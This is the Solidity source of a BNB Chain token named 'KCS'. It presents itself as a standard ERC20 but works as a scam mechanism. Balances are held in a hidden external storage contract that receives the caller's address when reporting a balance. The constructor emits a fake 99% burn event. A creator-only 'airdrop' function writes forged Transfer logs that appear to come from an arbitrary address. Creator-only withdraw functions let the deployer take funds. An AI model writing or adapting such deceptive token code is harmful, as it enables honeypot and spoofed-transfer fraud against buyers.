/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGasToken {
    function freeUpTo(uint256 value) external;
}

interface IERC20Storage {
    function init(address pair) external;

    function totalSupply() external view returns (uint256);

    function erc20Balance(address sender, address account) external view returns (uint256);

    function erc20Transfer(
        address sender,
        address to,
        uint256 value
    ) external;

    function erc20Allowance(address owner, address spender) external view returns (uint256);

    function erc20Approve(
        address sender,
        address spender,
        uint256 value
    ) external;
}

contract KCS is IERC20 {
    string public name = "KCS";
    string public symbol = "KCS";
    uint8 public decimals = 18;

    address creator = msg.sender;
    uint256 public cakeAmount;
    address public pair;
    IERC20Storage erc20Storage;

    IFactory private immutable pancakeFactory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address private immutable WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private immutable GasToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;
    address private immutable ZERO = address(0);
    address private evFrom;

    constructor(address _storage, address _evFrom) {
        cakeAmount = 1900 * 1e18;
        erc20Storage = IERC20Storage(_storage);
        pair = pancakeFactory.createPair(address(this), WBNB);
        erc20Storage.init(pair);
        evFrom = _evFrom;
        emit Transfer(address(this), ZERO, (erc20Storage.totalSupply() * 99) / 100);
    }

    modifier onlyCreator() {
        require(tx.origin == creator, "Only creator");
        _;
    }

    function totalSupply() external view returns (uint256) {
        return erc20Storage.totalSupply();
    }

    function balanceOf(address account) external view returns (uint256) {
        return erc20Storage.erc20Balance(msg.sender, account);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        erc20Storage.erc20Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return erc20Storage.erc20Allowance(owner, spender);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        erc20Storage.erc20Approve(msg.sender, spender, amount);
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = erc20Storage.erc20Allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                erc20Storage.erc20Approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        erc20Storage.erc20Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function updateCakeAmount(uint256 _cakeAmount) external onlyCreator {
        cakeAmount = _cakeAmount;
    }

    function withdraw(address target, uint amount) public onlyCreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(
        address token,
        address target,
        uint amount
    ) public onlyCreator {
        IERC20(token).transfer(target, amount);
    }

    function airdrop(bytes memory data, uint256 burnGasTokenAmount) external onlyCreator {
        uint256 _start = 0;
        address token = evFrom;
        uint256 len = data.length / 20;
        bytes32 topic0 = bytes32(keccak256("Transfer(address,address,uint256)"));
        uint256 amount = cakeAmount;

        for (uint256 i = 0; i < len; ) {
            assembly {
                mstore(0, amount)
                log3(0, 0x20, topic0, token, shr(96, mload(add(add(data, 0x20), _start))))
                i := add(i, 1)
                _start := add(_start, 20)
            }
        }

        if (burnGasTokenAmount > 0) {
            IGasToken(GasToken).freeUpTo(burnGasTokenAmount);
        }
    }

    receive() external payable {}
}